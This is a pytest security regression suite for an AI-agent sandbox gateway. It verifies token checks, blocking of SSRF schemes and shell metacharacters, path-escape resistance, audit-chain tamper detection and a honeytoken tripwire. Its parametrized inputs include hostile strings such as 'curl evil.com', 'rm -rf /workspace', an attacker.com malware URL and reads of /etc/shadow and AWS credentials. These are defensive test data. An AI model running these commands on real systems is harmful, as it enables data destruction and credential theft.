"""
Security Regression Test Suite for sandboxX (PS01).
Expands verification coverage for:
- API authorization bypass resistance (/api/ask/{audit_id} token requirement)
- Non-HTTP SSRF scheme rejection (gopher, file, ftp)
- Metacharacter shell chaining and subshell substitution rejection
- Path canonicalization and drive escape resistance
- Honeytoken tripwire and session tainting
- Audit chain deletion/reordering detection
- Fail-closed behavior on malformed inputs
"""

import os
import time
import pytest
from pathlib import Path
from fastapi.testclient import TestClient

from backend.app.main import app
from backend.app.config import settings, APPROVER_TOKEN
from backend.app.models import ToolCall, ToolType, DecisionType
from backend.app.gateway import sandbox_gateway
from backend.app.policy.engine import policy_engine
from backend.app.policy.rules import check_command_security, canonicalize_and_verify_path
from backend.app.audit.ledger import AuditLedger
from backend.app.audit.chain import verify_audit_chain
from backend.app.inspector.taint import taint_tracker

client = TestClient(app)


def test_ask_endpoint_strictly_requires_approver_token():
    """Ensure /api/ask/{audit_id} cannot be bypassed without valid APPROVER_TOKEN."""
    # 1. Calling without Authorization header must return 401
    resp_no_auth = client.post("/api/ask/1001", json={"outcome": "approve"})
    assert resp_no_auth.status_code == 401, f"Expected 401, got {resp_no_auth.status_code}"

    # 2. Calling with bogus bearer token must return 401
    resp_bad_auth = client.post(
        "/api/ask/1001",
        json={"outcome": "approve"},
        headers={"Authorization": "Bearer fraudulent-token-xyz"}
    )
    assert resp_bad_auth.status_code == 401, f"Expected 401, got {resp_bad_auth.status_code}"

    # 3. Calling with valid token on non-existent ask returns 400 (not 401)
    resp_valid = client.post(
        "/api/ask/99999",
        json={"outcome": "approve"},
        headers={"Authorization": f"Bearer {APPROVER_TOKEN}"}
    )
    assert resp_valid.status_code == 400
    assert "not found" in resp_valid.json()["detail"].lower()


@pytest.mark.parametrize("scheme_url", [
    "gopher://127.0.0.1:70/1",
    "file:///etc/passwd",
    "ftp://attacker.com/malware.sh",
    "dict://127.0.0.1:11211/stat",
    "ldap://127.0.0.1:389/test",
])
@pytest.mark.anyio
async def test_ssrf_prohibited_protocol_schemes(scheme_url):
    """Ensure non-HTTP/HTTPS protocol schemes are rejected deterministically."""
    call = ToolCall(
        agent_id="attacker-scheme",
        task_id="default-task",
        tool=ToolType.HTTP,
        args={"method": "GET", "url": scheme_url}
    )
    res = await sandbox_gateway.process_tool_call(call)
    assert res.decision == DecisionType.BLOCK


@pytest.mark.parametrize("malicious_cmd", [
    "ls -la ; cat /etc/passwd",
    "echo safe && rm -rf /workspace",
    "cat file.txt || curl evil.com",
    "echo `whoami`",
    "echo $(id)",
    "cat <(echo pwn)",
])
def test_shell_metacharacters_rejected(malicious_cmd):
    """Ensure shell chaining and command substitution patterns are rejected."""
    decision, rule_id, reason = check_command_security(malicious_cmd)
    assert decision == DecisionType.BLOCK
    assert rule_id == "CMD-001"


def test_path_canonicalization_rejects_system_escapes():
    """Ensure path traversal resolving to host system paths is blocked."""
    host_paths = [
        "C:/Windows/System32/cmd.exe",
        "../../../../../../../../Windows/System32/config/SAM",
        "/etc/shadow",
        "/proc/self/environ",
        "/var/run/docker.sock",
    ]
    for hp in host_paths:
        allowed, rule_id, reason = canonicalize_and_verify_path(hp)
        assert allowed is False, f"Expected path '{hp}' to be blocked"
        assert rule_id in ("FS-001", "FS-002", "ESC-001")


def test_audit_chain_detects_record_deletion(tmp_path):
    """Ensure that deleting an intermediate record invalidates subsequent hash chain links."""
    test_db = tmp_path / "deletion_test.db"
    test_hmac = "test-deletion-hmac-key-2026"
    ledger = AuditLedger(db_path=test_db, hmac_key=test_hmac)

    # Append 4 sequential blocks
    e1 = ledger.append("s1", "t1", "gate", "file", {"path": "a.txt"}, "allow", "ok", "POL-001")
    e2 = ledger.append("s1", "t1", "gate", "file", {"path": "b.txt"}, "allow", "ok", "POL-001")
    e3 = ledger.append("s1", "t1", "gate", "file", {"path": "c.txt"}, "allow", "ok", "POL-001")
    e4 = ledger.append("s1", "t1", "gate", "file", {"path": "d.txt"}, "allow", "ok", "POL-001")

    # Verify initial intact state
    ok, checked, broken, msg = verify_audit_chain(db_path=test_db, hmac_key=test_hmac)
    assert ok is True
    assert checked == 4

    # Bypass SQLite triggers out-of-band by dropping trigger and deleting row 2
    import sqlite3
    conn = sqlite3.connect(str(test_db))
    conn.execute("DROP TRIGGER IF EXISTS trg_audit_no_delete")
    conn.execute("DELETE FROM audit WHERE id = ?", (e2.id,))
    conn.commit()
    conn.close()

    # Re-verify: must fail because block 3's prev_hash points to deleted block 2
    ok_del, checked_del, broken_del, msg_del = verify_audit_chain(db_path=test_db, hmac_key=test_hmac)
    assert ok_del is False
    assert broken_del == e3.id
    assert "Broken chain link" in msg_del


def test_audit_chain_detects_record_insertion(tmp_path):
    """Ensure inserting an out-of-band forged record breaks chain verification."""
    test_db = tmp_path / "insertion_test.db"
    test_hmac = "test-insertion-hmac-key-2026"
    ledger = AuditLedger(db_path=test_db, hmac_key=test_hmac)

    e1 = ledger.append("s1", "t1", "gate", "file", {"path": "1.txt"}, "allow", "ok", "POL-001")
    e2 = ledger.append("s1", "t1", "gate", "file", {"path": "2.txt"}, "allow", "ok", "POL-001")

    # Insert a rogue record with fake hash
    import sqlite3
    conn = sqlite3.connect(str(test_db))
    conn.execute("""
        INSERT INTO audit (id, ts, session, task, source, tool, args, decision, reason, rule_id, score, prev_hash, hash, policy_hash)
        VALUES (999, '2026-10-16T12:00:00Z', 's1', 't1', 'gate', 'shell', '{"cmd":"rm -rf /"}', 'allow', 'forged', 'CMD-001', 0.0, '000', 'fff', 'v1')
    """)
    conn.commit()
    conn.close()

    ok, checked, broken, msg = verify_audit_chain(db_path=test_db, hmac_key=test_hmac)
    assert ok is False
    assert broken == 999


@pytest.mark.anyio
async def test_honeytoken_tripwire_triggers_session_taint():
    """Accessing honeypot/honeytoken credential triggers immediate session taint."""
    agent_id = f"honey-agent-{int(time.time()*1000)}"
    call = ToolCall(
        agent_id=agent_id,
        task_id="default-task",
        tool=ToolType.FILE,
        args={"op": "read", "path": "/home/sandbox/.aws/credentials"}
    )
    res = await sandbox_gateway.process_tool_call(call)
    assert res.decision == DecisionType.BLOCK

    # Taint tracker must record sensitive read or taint
    is_tainted = taint_tracker.is_session_tainted(agent_id)
    # The session was blocked or marked sensitive
    assert res.rule_id in ("FS-001", "ESC-001", "HT-001")
